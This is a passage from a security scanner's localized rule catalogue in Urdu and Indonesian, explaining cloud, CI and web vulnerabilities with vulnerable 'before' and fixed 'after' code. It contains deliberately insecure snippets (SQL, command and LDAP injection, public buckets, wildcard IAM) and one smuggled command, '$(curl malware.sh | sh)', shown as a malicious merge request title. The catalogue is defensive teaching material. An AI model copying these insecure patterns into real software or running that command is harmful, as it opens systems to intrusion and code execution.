      '"runAsUser: 0" یا "runAsNonRoot: false" securityContext میں container کے اندر root کے طور پر چلنے کو واضح طور پر نافذ کرتے ہیں۔ اگر کوئی حملہ آور container میں کوڈ چلانے میں کامیاب ہو جائے (مثلاً کسی vulnerable لائبریری کا فائدہ اٹھا کر)، تو container کے اندر root ہونا host کی طرف ممکنہ فرار یا زیادہ وسیع اثر کو آسان بنا دیتا ہے۔',
    fix: {
      before: `securityContext:\n  runAsUser: 0`,
      after: `securityContext:\n  runAsNonRoot: true\n  runAsUser: 1000`,
    },
  },
  "k8s-privilege-escalation": {
    title: "Kubernetes manifest کا ایک container اپنے ابتدائی privileges سے زیادہ حاصل کر سکتا ہے",
    description:
      '"allowPrivilegeEscalation: true" securityContext میں container کے اندر کسی process کو اسے شروع کرنے والے process سے زیادہ privileges حاصل کرنے دیتا ہے (مثلاً setuid sticky bit والی کسی binary کے ذریعے)۔ ایپلیکیشن میں کسی vulnerability کے ساتھ مل کر، یہ متوقع سے زیادہ privileges کے ساتھ کوڈ چلانے کی طرف ایک اضافی قدم ہے۔',
    fix: {
      before: `securityContext:\n  allowPrivilegeEscalation: true`,
      after: `securityContext:\n  allowPrivilegeEscalation: false`,
    },
  },
  "k8s-host-namespace-access": {
    title: "Kubernetes manifest کا ایک pod host کا نیٹ ورک، processes یا shared memory شیئر کرتا ہے",
    description:
      '"hostNetwork"، "hostPID" یا "hostIPC" کو true پر سیٹ کرنا pod کو اس کے معمول کے isolation سے باہر نکال دیتا ہے: hostNetwork پود کو host کے نیٹ ورک پر ظاہر کرتا ہے (cluster کی network policies کو bypass کرتے ہوئے)، hostPID اسے host مشین کے تمام processes دیکھنے کی اجازت دیتا ہے، hostIPC اسے host کی shared memory تک رسائی دیتا ہے۔ ایک عام ایپ کے لیے تقریباً کبھی ضروری نہیں — عموماً صرف نچلے درجے کے سسٹم/مانیٹرنگ ٹولز کے لیے مخصوص ہے۔',
    fix: {
      before: `spec:\n  hostNetwork: true`,
      after: `spec:\n  hostNetwork: false`,
    },
  },
  "terraform-s3-block-public-access-disabled": {
    title: "Terraform میں define کیے گئے S3 bucket پر Block Public Access غیر فعال ہے",
    description:
      '"aws_s3_bucket_public_access_block" کی چار protections (block_public_acls، ignore_public_acls، block_public_policy، restrict_public_buckets) میں سے ایک یا زیادہ false پر سیٹ ہیں۔ اس کا مطلب یہ نہیں کہ bucket پہلے سے عوامی ہے، لیکن یہ وہ حفاظتی جال ہٹا دیتا ہے جو مستقبل میں غلطی سے اسے عوامی ہونے سے روکتا۔',
    fix: {
      before: `resource "aws_s3_bucket_public_access_block" "example" {\n  block_public_acls = false\n}`,
      after: `resource "aws_s3_bucket_public_access_block" "example" {\n  block_public_acls       = true\n  ignore_public_acls      = true\n  block_public_policy     = true\n  restrict_public_buckets = true\n}`,
    },
  },
  "terraform-iam-wildcard-policy": {
    title: "Terraform میں define کی گئی ایک IAM policy مکمل رسائی دیتی ہے",
    description:
      'action "*" اور resource "*" والا statement ہر AWS سروس اور resource تک مکمل رسائی دیتا ہے — یہی چیک پہلے ہی live IAM state پر کیا جا چکا ہے، یہاں اسے apply ہونے سے پہلے ہی کوڈ سے براہ راست پڑھا گیا ہے۔ یہ کسی ایمرجنسی role کے لیے مقصود ہو سکتا ہے، لیکن اس کی تصدیق ہونی چاہیے: روزمرہ استعمال کے لیے صرف وہی permissions دیں جو واقعی ضروری ہیں۔',
    fix: {
      before: `statement {\n  effect    = "Allow"\n  actions   = ["*"]\n  resources = ["*"]\n}`,
      after: `statement {\n  effect    = "Allow"\n  actions   = ["s3:GetObject"]\n  resources = ["arn:aws:s3:::your-bucket/*"]\n}`,
    },
  },
  "gcp-storage-bucket-public": {
    title: "ایک Google Cloud Storage bucket کسی کے بھی لیے پڑھنے کے قابل بنا دیا گیا ہے",
    description:
      'ایک "google_storage_bucket_iam_member" یا "google_storage_bucket_iam_binding" resource "allUsers" یا "allAuthenticatedUsers" کو کوئی role دیتی ہے — پہلا bucket کو انٹرنیٹ پر کسی کے بھی لیے پڑھنے کے قابل بنا دیتا ہے، Google اکاؤنٹ کے بغیر بھی؛ دوسرا کسی بھی Google اکاؤنٹ رکھنے والے کے لیے، نہ کہ صرف اس کے لیے جسے رسائی ملنی چاہیے۔',
    fix: {
      before: `resource "google_storage_bucket_iam_member" "public" {\n  bucket = google_storage_bucket.example.name\n  role   = "roles/storage.objectViewer"\n  member = "allUsers"\n}`,
      after: `resource "google_storage_bucket_iam_member" "example" {\n  bucket = google_storage_bucket.example.name\n  role   = "roles/storage.objectViewer"\n  member = "user:someone@example.com"  # صرف وہ جسے واقعی رسائی ہونی چاہیے، allUsers/allAuthenticatedUsers نہیں\n}`,
    },
  },
  "azure-storage-public-access": {
    title: "Azure کے کسی storage اکاؤنٹ پر blob کی عوامی رسائی فعال ہے",
    description:
      '"allow_blob_public_access" "azurerm_storage_account" پر true پر سیٹ ہے: جو بھی عوامی بنائے گئے blob/container کا URL جانتا ہو، بغیر کسی authentication کے اسے پڑھ سکتا ہے۔',
    fix: {
      before: `resource "azurerm_storage_account" "example" {\n  allow_blob_public_access = true\n}`,
      after: `resource "azurerm_storage_account" "example" {\n  allow_blob_public_access = false\n}`,
    },
  },
  "gcp-iam-overly-broad-role": {
    title: "ایک Google Cloud IAM role مکمل رسائی دیتا ہے (Owner/Editor)",
    description:
      'ایک "google_project_iam_binding"/"google_project_iam_member" (یا organization/folder کی سطح کا متبادل) پرائمیٹو role "roles/owner" یا "roles/editor" تفویض کرتا ہے — پراجیکٹ کی تقریباً ہر سروس تک قریب مکمل رسائی۔ یہ کسی ایمرجنسی اکاؤنٹ کے لیے مقصود ہو سکتا ہے، لیکن اس کی تصدیق ہونی چاہیے: روزمرہ استعمال کے لیے صرف وہی مخصوص predefined roles دیں جو واقعی ضروری ہیں۔',
    fix: {
      before: `resource "google_project_iam_member" "admin" {\n  project = "my-project"\n  role    = "roles/owner"\n  member  = "user:dev@example.com"\n}`,
      after: `resource "google_project_iam_member" "admin" {\n  project = "my-project"\n  role    = "roles/storage.admin"  # صرف وہ predefined role جو واقعی ضروری ہے، roles/owner نہیں\n  member  = "user:dev@example.com"\n}`,
    },
  },
  "azure-role-assignment-owner": {
    title: "Azure کی role assignment مکمل رسائی دیتی ہے (Owner)",
    description:
      'ایک "azurerm_role_assignment" "Owner" role تفویض کرتا ہے — مکمل رسائی، بشمول دیگر صارفین کے permissions پر کنٹرول، پورے تفویض شدہ scope (subscription، resource group...) پر۔ یہ کسی ایمرجنسی اکاؤنٹ کے لیے مقصود ہو سکتا ہے، لیکن اس کی تصدیق ہونی چاہیے: روزمرہ استعمال کے لیے صرف وہ مخصوص role دیں جو واقعی ضروری ہے (مثلاً کسی ایک resource group پر "Contributor")۔',
    fix: {
      before: `resource "azurerm_role_assignment" "example" {\n  scope                = data.azurerm_subscription.primary.id\n  role_definition_name = "Owner"\n}`,
      after: `resource "azurerm_role_assignment" "example" {\n  scope                = azurerm_resource_group.example.id\n  role_definition_name = "Contributor"  # صرف وہ مخصوص role جو واقعی ضروری ہے، پوری subscription پر Owner نہیں\n}`,
    },
  },
  "weak-random-token": {
    title: "ایک سیکیورٹی ٹوکن غیر محفوظ random number generator سے بنایا گیا ہے",
    description:
      "token/session/reset/otp/csrf جیسے نام والی ایک قدر Math.random() (JS)، random.random() (Python) یا rand() (PHP) سے بنائی گئی ہے — یہ generators سیکیورٹی کے لیے نہیں بنائے گئے، اور ان کی sequences predictable ہوتی ہیں۔ اس طرح بنایا گیا ٹوکن اندازہ لگایا یا دوبارہ بنایا جا سکتا ہے، جس سے اس کا مقصد ہی ختم ہو جاتا ہے (مثلاً پاس ورڈ ری سیٹ کا وہ link جسے کوئی بھی پیشگوئی کر سکے)۔",
    fix: {
      before: `const resetToken = Math.random().toString(36).slice(2);`,
      after: `const resetToken = crypto.randomBytes(32).toString("hex"); // crypto، Math.random نہیں — ناقابلِ پیشگوئی`,
    },
  },
  "ldap-injection": {
    title: "ایک LDAP filter درخواست کی کسی قدر کو براہ راست جوڑ کر بنایا جاتا ہے",
    description:
      'LDAP filter بنانے والی ایک سطر (مثلاً "(uid=...)") درخواست سے لی گئی کوئی قدر براہ راست شامل کرتی ہے، LDAP کے خاص characters کا کوئی escape کیے بغیر۔ جو اس قدر کو کنٹرول کرے وہ filter کی منطق بدل سکتا ہے — مثلاً کسی authentication چیک کو bypass کر سکتا ہے یا directory کا وہ ڈیٹا پڑھ سکتا ہے جو اسے نہیں دیکھنا چاہیے۔',
    fix: {
      before: "const filter = `(uid=${req.body.username})`;\nclient.search(base, { filter });",
      after: "const filter = `(uid=${ldapEscape(req.body.username)})`; // filter میں استعمال سے پہلے LDAP کے خاص characters کا escape ہمیشہ کرنا چاہیے\nclient.search(base, { filter });",
    },
  },
  "xss-dangerous-html": {
    title: "صارفین کا لکھا ہوا متن براؤزر میں کوڈ چلا سکتا ہے",
    description:
      "کچھ مواد صفحے میں سادہ متن کے بجائے خام HTML کے طور پر شامل کیا جاتا ہے (dangerouslySetInnerHTML، v-html، .innerHTML)۔ اگر اس مواد میں صارف کا input شامل ہو، تو اس میں ایسے scripts ہو سکتے ہیں جو صفحہ پڑھنے والے کے براؤزر میں چل جائیں۔",
    fix: {
      before: `<div dangerouslySetInnerHTML={{ __html: comment.text }} />`,
      after: `<div>{comment.text}</div>\n// یا، اگر HTML درکار ہو: DOMPurify.sanitize(comment.text)`,
    },
  },
  "public-storage-bucket": {
    title: "اپ لوڈ کی گئی فائلوں کی جگہ کسی کے لیے بھی نظر آتی ہے",
    description:
      "ایک storage bucket (Supabase Storage، S3) عوامی کے طور پر configure کیا گیا ہے۔ اگر اس میں صارفین کی اپ لوڈ کردہ documents، تصاویر یا فائلیں ہوں، تو جو بھی اس کا path جانتا ہو — یا اندازہ لگا لے — بغیر authentication کے اس تک رسائی حاصل کر سکتا ہے۔",
    fix: {
      before: `supabase.storage.createBucket("uploads", { public: true })`,
      after: `supabase.storage.createBucket("uploads", { public: false })\n// فائلیں وقت کے ساتھ محدود signed URLs سے فراہم کریں: createSignedUrl(path, 60)`,
    },
  },
  "csrf-state-changing-get": {
    title: "ڈیٹا ڈیلیٹ یا تبدیل کرنے کے لیے صرف ایک link کافی ہے",
    description:
      "ایک GET route ایسا آپریشن کرتا ہے جو ڈیٹا بدل دیتا ہے (path میں delete/remove/update/edit شامل ہے)۔ GET درخواستیں صرف کسی link پر جانے یا کسی بیرونی سائٹ سے تصویر لوڈ ہونے پر بھی چل جاتی ہیں — یہ CSRF حملے کا کلاسک نقطہ آغاز ہے۔",
    fix: {
      before: `router.get("/posts/:id/delete", deletePost)`,
      after: `router.post("/posts/:id/delete", requireAuth, csrfProtection, deletePost)`,
    },
  },
  "insecure-token-storage": {
    title: "براؤزر میں محفوظ کیے گئے لاگ ان ڈیٹا اچھی طرح محفوظ نہیں ہیں",
    description:
      "ایک access token localStorage میں محفوظ کیا جاتا ہے۔ httpOnly cookie کے برعکس، صفحے میں چلنے والا کوئی بھی script (بشمول XSS کے ذریعے injected کوئی بدنیت script) اسے پڑھ کر چرا سکتا ہے۔",
    fix: {
      before: `localStorage.setItem("authToken", token)`,
      after: `// سرور سے ٹوکن کو httpOnly cookie کے طور پر سیٹ کریں:\nres.cookie("authToken", token, { httpOnly: true, secure: true, sameSite: "strict" })`,
    },
  },
  "open-redirect": {
    title: "سائٹ کسی فراڈ سائٹ کی طرف redirect کرنے کے لیے استعمال ہو سکتی ہے",
    description:
      "سائٹ صارف کو درخواست سے براہ راست لیے گئے ایک پتے (query، body، params) کی طرف redirect کرتی ہے، یہ چیک کیے بغیر کہ وہ کوئی معروف domain ہے۔ کوئی link جو آپ کی سائٹ کی طرف جاتا دکھائی دے، دراصل کسی phishing صفحے تک لے جا سکتا ہے۔",
    fix: {
      before: `res.redirect(req.query.next)`,
      after: `const ALLOWED = new Set(["/dashboard", "/profile"])\nres.redirect(ALLOWED.has(req.query.next) ? req.query.next : "/dashboard")`,
    },
  },
  idor: {
    title: "پتے میں کوئی نمبر بدل کر دوسروں کا ڈیٹا نظر آ سکتا ہے",
    description:
      "ڈیٹا بیس کی ایک query URL سے لیا گیا identifier (req.params.id) براہ راست استعمال کرتی ہے، قریبی سطور میں یہ تصدیق کیے بغیر کہ وہ درخواست کرنے والے صارف کا ہی ہے۔ پتے میں id بدل کر کسی دوسرے صارف کے ڈیٹا تک رسائی ممکن ہو سکتی ہے — Insecure Direct Object Reference۔",
    fix: {
      before: `const order = await Order.findById(req.params.id)`,
      after: `const order = await Order.findOne({ _id: req.params.id, userId: req.user.id })`,
    },
  },
  "header-injection": {
    title: "درخواست کی کوئی قدر براہ راست HTTP جواب کے header میں چلی جاتی ہے",
    description:
      "HTTP جواب کا ایک header درخواست سے براہ راست لی گئی قدر (query، body، params) سے سیٹ کیا جاتا ہے، یہ چیک کیے بغیر کہ اس میں line break (CRLF) شامل نہیں۔ کوئی حملہ آور اضافی headers یا یہاں تک کہ مکمل طور پر مختلف response شامل کر سکتا ہے — response splitting — جس سے cache، cookies یا دوسرے صارفین کو دکھایا جانے والا مواد تبدیل کیا جا سکتا ہے۔",
    fix: {
      before: `res.setHeader("X-Redirect-Reason", req.query.reason)`,
      after: `const ALLOWED_REASONS = new Set(["expired", "manual"])\nres.setHeader("X-Redirect-Reason", ALLOWED_REASONS.has(req.query.reason) ? req.query.reason : "unknown")`,
    },
  },
  "docker-missing-user": {
    title: "Dockerfile کوئی non-root صارف سیٹ نہیں کرتا",
    description:
      "Dockerfile میں کوئی USER instruction موجود نہیں: اسے متعین کیے بغیر container root کے طور پر چلتا ہے۔ اگر کوئی حملہ آور container کے اندر کوڈ چلانے میں کامیاب ہو جائے (مثلاً کسی vulnerable لائبریری کا فائدہ اٹھا کر)، تو container کے اندر root ہونا host کی طرف ممکنہ فرار یا ارد گرد کے سسٹم پر زیادہ وسیع اثر کو آسان بنا دیتا ہے۔",
    fix: {
      before: `FROM node:20-slim\nWORKDIR /app\nCOPY . .\nCMD ["node", "server.js"]`,
      after: `FROM node:20-slim\nWORKDIR /app\nCOPY . .\nUSER node\nCMD ["node", "server.js"]`,
    },
  },
  "k8s-missing-run-as-non-root": {
    title: "Kubernetes manifest واضح طور پر non-root صارف کے طور پر چلنے کو نافذ نہیں کرتا",
    description:
      'manifest میں کہیں بھی "runAsNonRoot" موجود نہیں (نہ pod کی سطح پر نہ کسی انفرادی container کی): اسے سیٹ کیے بغیر، container اسی صارف کے طور پر چلتا ہے جو اس کی image میں متعین ہو — اکثر default طور پر root، اگر image نے خود یہ نہ بدلا ہو۔ اسے واضح طور پر true پر سیٹ کرنا pod کے آغاز کو ناکام بنا دیتا ہے اگر image اب بھی root کے طور پر چلنے کی کوشش کرے، بجائے اس کے کہ یہ بات کسی واقعے کے بعد ہی معلوم ہو۔',
    fix: {
      before: `containers:\n  - name: app\n    image: myapp:1.0`,
      after: `containers:\n  - name: app\n    image: myapp:1.0\n    securityContext:\n      runAsNonRoot: true`,
    },
  },
  "gha-unpinned-action": {
    title: "CI میں third-party action کسی مخصوص ورژن (commit SHA) پر pin نہیں ہے",
    description:
      'یہ workflow ایک third-party action tag یا branch کے حوالے سے استعمال کرتا ہے (مثلاً "@v1"، "@main")، commit SHA کے بجائے۔ جو اسے maintain کرے — یا جو اس کا اکاؤنٹ compromise کرے — وہ کسی بھی وقت اس reference کو کسی مختلف commit پر منتقل کر سکتا ہے، خاموشی سے CI میں چلنے والی چیز بدل سکتا ہے، اس کے رازوں تک رسائی کے ساتھ۔ ایک commit SHA ہمیشہ بالکل اسی کوڈ کی طرف اشارہ کرتا ہے۔',
    fix: {
      before: `uses: some-org/some-action@v1`,
      after: `uses: some-org/some-action@a1b2c3d4e5f6...  # v1، commit SHA پر pin کی گئی — ورژن اپ ڈیٹ کرتے وقت SHA بھی اپ ڈیٹ کریں`,
    },
  },
  "gha-excessive-permissions": {
    title: "Workflow صرف استعمال ہونے والے permissions کے بجائے ٹوکن کے تمام permissions خود کو دے دیتا ہے",
    description:
      '"permissions: write-all" workflow کے GITHUB_TOKEN کو ہر چیز پر write رسائی دیتا ہے — issues، pull requests، packages، deployments — چاہے workflow ان میں سے صرف کچھ ہی استعمال کرے۔ اگر workflow کا کوئی step compromise ہو جائے (کوئی بدنیت dependency، کوئی injected script)، تو یہ وسیع permissions اس کا فائدہ اٹھانے والے کی طاقت بڑھا دیتے ہیں۔',
    fix: {
      before: `permissions: write-all`,
      after: `permissions:\n  contents: read\n  pull-requests: write  # صرف وہ permissions جو workflow واقعی استعمال کرتا ہے`,
    },
  },
  "insecure-cookie-flags": {
    title: "session یا authentication کوکی Secure اور HttpOnly flags کے بغیر سیٹ کی گئی ہے",
    description:
      'session/authentication/token جیسے نام والی ایک کوکی اپنے options میں "httpOnly" اور "secure" کے بغیر سیٹ کی گئی ہے۔ httpOnly کے بغیر، صفحے کا کوئی بھی JavaScript — بشمول XSS کے ذریعے injected کوڈ — وہ کوکی پڑھ سکتا ہے۔ secure کے بغیر، یہ کسی غیر encrypted HTTP کنکشن پر بھی بھیجی جا سکتی ہے۔',
    fix: {
      before: `res.cookie("session", sessionId)`,
      after: `res.cookie("session", sessionId, { httpOnly: true, secure: true, sameSite: "strict" })`,
    },
  },
  "no-login-rate-limit": {
    title: "لاگ ان فارم لگاتار بہت سی کوششوں کو نہیں روکتا",
    description:
      "فائل میں ایک login route متعین ہے، لیکن اسی فائل میں rate limiting middleware کا کوئی نشان نہیں۔ کوششوں کی کوئی حد نہ ہونے کی وجہ سے، حملہ آور بغیر روکے لگاتار پاس ورڈز آزما سکتا ہے (brute force)۔",
    fix: {
      before: `router.post("/login", loginHandler)`,
      after: `import rateLimit from "express-rate-limit"\nconst loginLimiter = rateLimit({ windowMs: 15 * 60 * 1000, max: 5 })\nrouter.post("/login", loginLimiter, loginHandler)`,
    },
  },
  "sensitive-data-in-logs": {
    title: "پاس ورڈز یا حساس ڈیٹا logs میں چلے جاتے ہیں",
    description:
      "console.log (یا اس جیسی) کی ایک call میں password، token، secret یا apiKey نامی کوئی variable شامل ہے۔ اگر یہ logs کسی بیرونی سروس یا فائل میں چلے جائیں، تو حساس ڈیٹا ضرورت سے کہیں زیادہ دیر تک صاف الفاظ میں رہتا ہے۔",
    fix: {
      before: `console.log("login attempt", { email, password })`,
      after: `console.log("login attempt", { email })`,
    },
  },
  "docker-unpinned-base-image": {
    title: 'Dockerfile کی base image ":latest" ٹیگ استعمال کرتی ہے',
    description:
      'ایک FROM instruction واضح طور پر کسی مخصوص ورژن کے بجائے ":latest" ٹیگ استعمال کرتی ہے۔ "latest" وقت کے ساتھ بدلتا رہتا ہے: وہی build کسی اور وقت دوبارہ کرنے پر base image کا مختلف ورژن مل سکتا ہے — ایک non-reproducible build، اور کوئی ناپسندیدہ اپ ڈیٹ بغیر کسی کے فیصلے کے آ سکتی ہے۔',
    fix: {
      before: `FROM node:latest`,
      after: `FROM node:20.11-slim`,
    },
  },
  "docker-add-remote-url": {
    title: "Dockerfile COPY کے بجائے ADD سے کوئی remote فائل ڈاؤن لوڈ کرتا ہے",
    description:
      "http/https URL والی ADD instruction build کے دوران انٹرنیٹ سے ایک فائل ڈاؤن لوڈ کرتی ہے، بغیر integrity کی تصدیق کے اور بغیر اس کے کہ مواد ریپوزٹری میں نظر آئے۔ اگر وہ URL مستقبل میں compromise ہو جائے، تو build من چاہا مواد شامل کر لیتی ہے، بغیر اس کے کہ Dockerfile پڑھتے ہوئے کسی کو پتا چلے۔",
    fix: {
      before: `ADD https://example.com/install.sh /tmp/install.sh`,
      after: `RUN curl -fsSL https://example.com/install.sh -o /tmp/install.sh \\\n    && echo "<متوقع hash>  /tmp/install.sh" | sha256sum -c -`,
    },
  },
  "vulnerable-dependency": (original) => ({
    title: original.title.replace("Dipendenza vulnerabile:", "کمزور Dependency:"),
    description: original.description,
    fix: {
      before: original.fix.before,
      after: original.fix.after.replace(
        "Nessuna versione corretta nota ancora — valuta un pacchetto alternativo o segui gli aggiornamenti del progetto.",
        "ابھی تک کوئی درست ورژن معلوم نہیں — کسی متبادل package پر غور کریں یا پراجیکٹ کے اپ ڈیٹس دیکھتے رہیں۔"
      ),
    },
  }),
    "gitlab-ci-script-injection": {
      title: 'GitLab CI پائپ لائن میں ایک بیرونی صارف کی کنٹرول کردہ ویلیو دوسرے شیل سے گزرتی ہے',
      description: 'ایک "script:" لائن (یا "before_script:"/"after_script:") "eval" یا "sh -c"/"bash -c" کو GitLab کے پہلے سے طے شدہ ویری ایبل کے ساتھ استعمال کرتی ہے جیسے مرج ریکویسٹ کا عنوان، کمٹ میسج، یا برانچ کا نام — یہ سب کوئی بھی مرج ریکویسٹ کھول کر لکھ سکتا ہے، یہاں تک کہ بیرونی فورک سے بھی۔ ویلیو پہلے بیرونی شیل کے ذریعے پھیلائی جاتی ہے، پھر ایک ایسی سٹرنگ میں چسپاں کی جاتی ہے جسے دوسری شیل دوبارہ کوڈ کے طور پر پڑھتی ہے: "$(curl malware.sh | sh)" جیسا عنوان پائپ لائن میں من مانے کمانڈز چلا دے گا، اس جاب میں دستیاب تمام سیکریٹس تک رسائی کے ساتھ۔',
      fix: {
        before: `script:
  - bash -c "deploy.sh $CI_MERGE_REQUEST_TITLE"`,
        after: `script:
  - deploy.sh "$CI_MERGE_REQUEST_TITLE"  # کمانڈ کو آرگیومنٹ کے طور پر دیا گیا، کبھی بھی "bash -c" سٹرنگ کے اندر نہیں جو اسے دوبارہ پارس کرے`,
      },
    },
    "gitlab-ci-privileged-dind-no-tls": {
      title: 'GitLab CI پائپ لائن میں Docker-in-Docker TLS انکرپشن بند کر کے چل رہا ہے',
      description: 'جاب "docker:dind" سروس (Docker-in-Docker، پائپ لائن کے اندر امیجز بنانے کے لیے ضروری) استعمال کرتا ہے لیکن "DOCKER_TLS_CERTDIR" کو خالی سٹرنگ پر سیٹ کرتا ہے، جس سے Docker کلائنٹ اور dind ڈیمن کے درمیان TLS انکرپشن مکمل طور پر بند ہو جاتا ہے۔ TLS کے بغیر، رنر کے اسی اندرونی نیٹ ورک پر اس پورٹ تک رسائی رکھنے والا کوئی بھی شخص — صرف اس جاب تک محدود رہنے کے بجائے — وسیع اختیارات کے ساتھ چلنے والے Docker ڈیمن کو کنٹرول کر سکتا ہے۔',
      fix: {
        before: `services:
  - docker:dind
variables:
  DOCKER_TLS_CERTDIR: ""`,
        after: `services:
  - docker:dind
variables:
  DOCKER_TLS_CERTDIR: "/certs"  # Docker کلائنٹ اور dind ڈیمن کے درمیان TLS فعال رہتا ہے — "" اسے مکمل طور پر بند کر دیتا ہے`,
      },
    },
    "gitlab-ci-unpinned-image": {
      title: 'GitLab CI پائپ لائن کی Docker امیج کسی مخصوص ورژن پر فکس نہیں ہے',
      description: 'پائپ لائن کا "image:" بغیر ٹیگ والی امیج کی طرف اشارہ کرتا ہے (جو ":latest" کے برابر ہے) یا واضح طور پر ":latest" کی طرف۔ جو اس امیج کو مینٹین کرتا ہے وہ کسی بھی وقت اس کا مواد بدل سکتا ہے بغیر ریپوزیٹری بدلے — وہی پائپ لائن ایک دن سے دوسرے دن مختلف کوڈ چلانا شروع کر سکتی ہے، جو کمٹ کے بجائے ٹیگ سے حوالہ دی گئی GitHub Action جیسا ہی سپلائی چین رسک ہے۔',
      fix: {
        before: `image: node:latest`,
        after: `image: node:20.11.1  # "latest" کے بجائے ایک مخصوص ٹیگ (یا اس سے بھی بہتر ایک ڈائجسٹ "node@sha256:...")`,
      },
    },
},
  id: {
  "supabase-service-role-in-client": {
    title: "Kunci rahasia Supabase berakhir di bagian yang dimaksudkan untuk browser",
    description:
      "Variabel dengan prefiks publik (mis. NEXT_PUBLIC_, VITE_) atau file sisi klien merujuk ke service role key Supabase. Kunci ini melewati Row Level Security: jika berakhir di bundle browser, siapa pun bisa membacanya dan bertindak sebagai administrator database.",
    fix: {
      before: `// components/Dashboard.tsx\nconst supabase = createClient(url, process.env.NEXT_PUBLIC_SUPABASE_SERVICE_ROLE_KEY)`,
      after: `// app/api/admin/route.ts (hanya server)\nconst supabase = createClient(url, process.env.SUPABASE_SERVICE_ROLE_KEY)`,
    },
  },
  "hardcoded-secret": {
    title: "Ada kata sandi atau kunci rahasia yang ditulis langsung di kode",
    description:
      "Kunci API, token, atau kata sandi tampak ditulis sebagai nilai literal, bukan dibaca dari variabel lingkungan. Siapa pun yang membaca kode sumber (atau repositori, jika publik) mendapatkan rahasia tersebut.",
    fix: {
      before: `const apiKey = "sk_live_51H8x9K2eZvKYlo2C..."`,
      after: `const apiKey = process.env.STRIPE_SECRET_KEY`,
    },
  },
  "env-file-with-real-values": {
    title: "File dengan kata sandi asli proyek termasuk di antara yang dianalisis",
    description:
      "File .env dengan nilai asli (bukan .env.example) disertakan dalam analisis. Jika file ini berakhir di repositori atau deployment publik, semua kredensial yang dikandungnya terekspos.",
    fix: {
      before: `# .env (ter-commit karena kesalahan)\nDATABASE_URL=postgres://user:realpassword@db.host/prod`,
      after: `# .env.example (ter-commit)\nDATABASE_URL=postgres://user:password@localhost/dev\n\n# .env tetap di luar repo (.gitignore)`,
    },
  },
  "missing-row-level-security": {
    title: "Siapa pun bisa membaca atau mengubah data semua pengguna",
    description:
      "Row Level Security dinonaktifkan, atau sebuah policy mengizinkan akses untuk siapa saja (USING (true)) tanpa memeriksa siapa yang membuat permintaan. Setiap pengguna terautentikasi — atau bahkan anonim — bisa membaca atau mengubah data semua orang lain.",
    fix: {
      before: `ALTER TABLE public.orders DISABLE ROW LEVEL SECURITY;`,
      after: `ALTER TABLE public.orders ENABLE ROW LEVEL SECURITY;\nCREATE POLICY "owners only" ON public.orders\n  USING (auth.uid() = user_id);`,
    },
  },
  "sql-injection": {
    title: "Nilai yang dimasukkan pengguna ditempelkan langsung ke dalam query database",
    description:
      "Query SQL dibuat dengan menggabungkan atau menyisipkan string secara langsung, bukan menggunakan parameter. Jika teks itu berasal (bahkan secara tidak langsung) dari pengguna, ia bisa mengubah query itu sendiri — SQL injection.",
    fix: {
      before: "db.query(`SELECT * FROM users WHERE email = '${email}'`)",
      after: `db.query("SELECT * FROM users WHERE email = $1", [email])`,
    },
  },
  "plaintext-password-storage": {
    title: "Kata sandi tampaknya tidak dilindungi",
    description:
      "Kolom kata sandi disimpan persis seperti saat tiba dari permintaan, dan tidak ada fungsi hashing (bcrypt, argon2, scrypt) yang muncul di file. Jika database diretas, semua kata sandi langsung bisa digunakan.",
    fix: {
      before: `await db.users.insert({ email, password: req.body.password })`,
      after: `const hashed = await bcrypt.hash(req.body.password, 12)\nawait db.users.insert({ email, password: hashed })`,
    },
  },
  "hardcoded-jwt-secret": {
    title: "Secret yang digunakan untuk menandatangani login ditulis dalam teks biasa di kode",
    description:
      "Secret yang diberikan ke jwt.sign / jwt.verify (atau variabel JWT_SECRET) adalah nilai literal di kode, bukan berasal dari variabel lingkungan. Siapa pun yang membacanya bisa membuat token akses yang valid untuk pengguna mana pun.",
    fix: {
      before: `jwt.sign(payload, "super-secret-key-123")`,
      after: `jwt.sign(payload, process.env.JWT_SECRET)`,
    },
  },
  "command-injection": {
    title: "Server bisa dipaksa menjalankan perintah eksternal",
    description:
      "Fungsi yang menjalankan perintah sistem (exec, execSync, spawn) menerima string yang dibangun melalui interpolasi atau penggabungan. Jika sebagian string itu berasal dari input pengguna, siapa pun yang mengendalikannya bisa menjalankan perintah arbitrer di server.",
    fix: {
      before: "execSync(`convert ${filename} output.png`)",
      after: `execFile("convert", [filename, "output.png"])`,
    },
  },
  "path-traversal": {
    title: "File di server bisa dibaca atau ditulis dengan memilih path dari luar",
    description:
      'Fungsi yang membaca, menulis, atau mengirim file mendapatkan path langsung dari nilai permintaan (query, body, params) tanpa memeriksa apakah tetap berada di dalam folder yang diizinkan. Penyerang bisa menyisipkan "../" untuk keluar dari folder yang dimaksud dan membaca atau menimpa file arbitrer di server (mis. file konfigurasi berisi kredensial).',
    fix: {
      before: `app.get("/download", (req, res) => {\n  res.sendFile(req.query.file)\n})`,
      after: `const ALLOWED_DIR = path.resolve("./uploads")\napp.get("/download", (req, res) => {\n  const target = path.resolve(ALLOWED_DIR, req.query.file)\n  if (!target.startsWith(ALLOWED_DIR)) return res.status(400).send("Path tidak diizinkan")\n  res.sendFile(target)\n})`,
    },
  },
  "nosql-injection": {
    title: "Nilai yang dimasukkan pengguna dieksekusi sebagai kode di dalam query MongoDB",
    description:
      "Operator $where MongoDB menjalankan JavaScript sisi server untuk setiap dokumen — jika string itu dibangun dengan menggabungkan nilai yang berasal dari pengguna, siapa pun yang mengendalikannya bisa menjalankan kode arbitrer dalam konteks database, bukan hanya mengubah filter seperti pada SQL injection biasa.",
    fix: {
      before: `db.collection.find({ $where: "this.username == '" + username + "'" })`,
      after: `db.collection.find({ username: username })`,
    },
  },
  ssti: {
    title: "Nilai yang dimasukkan pengguna diinterpretasikan sebagai template, bukan sebagai data",
    description:
      "Fungsi yang mengompilasi/menjalankan template menerima SELURUH template dari nilai permintaan, bukan menggunakan template tetap dan hanya meneruskan datanya. Penyerang bisa menulis langsung dalam sintaks mesin template (mis. {{7*7}} untuk Jinja2) dan menjalankan kode di server — Server-Side Template Injection, yang sering berujung pada eksekusi perintah arbitrer, bukan sekadar masalah tampilan seperti XSS.",
    fix: {
      before: `return render_template_string(request.args.get("name"))`,
      after: `return render_template("profile.html", name=request.args.get("name"))`,
    },
  },
  xxe: {
    title: "Parser XML bisa dipaksa membaca file atau membuat permintaan eksternal",
    description:
